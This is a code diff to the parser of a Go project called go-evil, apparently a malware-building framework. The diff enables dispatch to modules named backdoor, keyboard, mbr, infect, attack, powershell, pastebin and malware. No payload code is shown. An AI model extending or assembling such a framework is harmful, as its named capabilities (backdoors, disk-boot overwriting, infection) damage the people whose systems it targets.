@@ -3,7 +3,16 @@ package parser
 import (
 	"fmt"
 
+	"github.com/s9rA16Bf4/go-evil/domains/attack_vector"
+	"github.com/s9rA16Bf4/go-evil/domains/backdoor"
+	"github.com/s9rA16Bf4/go-evil/domains/infect"
+	"github.com/s9rA16Bf4/go-evil/domains/keyboard"
+	"github.com/s9rA16Bf4/go-evil/domains/malware"
 	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	"github.com/s9rA16Bf4/go-evil/domains/mbr"
+	"github.com/s9rA16Bf4/go-evil/domains/network"
+	"github.com/s9rA16Bf4/go-evil/domains/pastebin"
+	"github.com/s9rA16Bf4/go-evil/domains/powershell"
 	"github.com/s9rA16Bf4/go-evil/domains/system"
 	"github.com/s9rA16Bf4/go-evil/domains/window"
 	"github.com/s9rA16Bf4/go-evil/utility/io"
@@ -40,54 +49,39 @@ func Parser(base_64_serialize_json string) string {
 			//io.Append_domain("system")
 			system.Parse(data_structure.File_gut[i])
 
-			// 	case "network", "#net":
-			// 		io.Append_domain("network")
-			// 		data_structure.Append_to_header("network")
-			// 		network.Parse(funct[0])
+		case "network", "#net":
+			//io.Append_domain("network")
+			network.Parse(data_structure.File_gut[i])
 
-			// 	case "malware", "#object", "#self", "#this":
-			// 		io.Append_domain("malware")
-			// 		data_structure.Append_to_header("malware")
-			// 		malware.Parse(funct[0])
+		case "malware", "#object", "#self", "#this":
+			//io.Append_domain("malware")
+			malware.Parse(data_structure.File_gut[i])
 
-			// 	case "keyboard":
-			// 		io.Append_domain("keyboard")
-			// 		data_structure.Append_to_header("keyboard")
-			// 		keyboard.Parse(funct[0])
+		case "keyboard":
+			notify.Warning("This module is still under development! Usage may veary")
+			keyboard.Parse(data_structure.File_gut[i])
 
-			// 	case "backdoor":
-			// 		io.Append_domain("backdoor")
-			// 		data_structure.Append_to_header("backdoor")
-			// 		backdoor.Parse(funct[0])
+		case "backdoor":
+			backdoor.Parse(data_structure.File_gut[i])
 
-			// 	case "attack":
-			// 		data_structure.Append_to_header("attack")
-			// 		attack_vector.Parse(funct[0])
+		case "attack":
+			attack_vector.Parse(data_structure.File_gut[i])
 
-			// 	case "powershell", "#pwsh":
-			// 		data_structure.Append_to_header("powershell")
-			// 		io.Append_domain("powershell")
-			// 		powershell.Parse(funct[0])
+		case "powershell", "#pwsh":
+			notify.Warning("This module is still under development! Usage may veary")
+			powershell.Parse(data_structure.File_gut[i])
 
-			// 	case "time", "#wait":
-			// 		data_structure.Append_to_header("time")
-			// 		io.Append_domain("time")
-			// 		time.Parse(funct[0])
+		// case "time", "#wait":
+		// 	time.Parse(data_structure.File_gut[i])
 
-			// 	case "pastebin", "#paste":
-			// 		data_structure.Append_to_header("pastebin")
-			// 		io.Append_domain("pastebin")
-			// 		pastebin.Parse(funct[0])
+		case "pastebin", "#paste":
+			pastebin.Parse(data_structure.File_gut[i])
 
-			// 	case "mbr":
-			// 		data_structure.Append_to_header("mbr")
-			// 		io.Append_domain("mbr")
-			// 		mbr.Parse(funct[0])
+		case "mbr":
+			mbr.Parse(data_structure.File_gut[i])
 
-			// 	case "infect":
-			// 		data_structure.Append_to_header("infect")
-			// 		io.Append_domain("infect")
-			// 		infect.Parse(funct[0])
+		case "infect":
+			infect.Parse(data_structure.File_gut[i])
 
 		default:
 			notify.Error(fmt.Sprintf("Unknown top level domain '%s'", domain), "parser.Parse()")
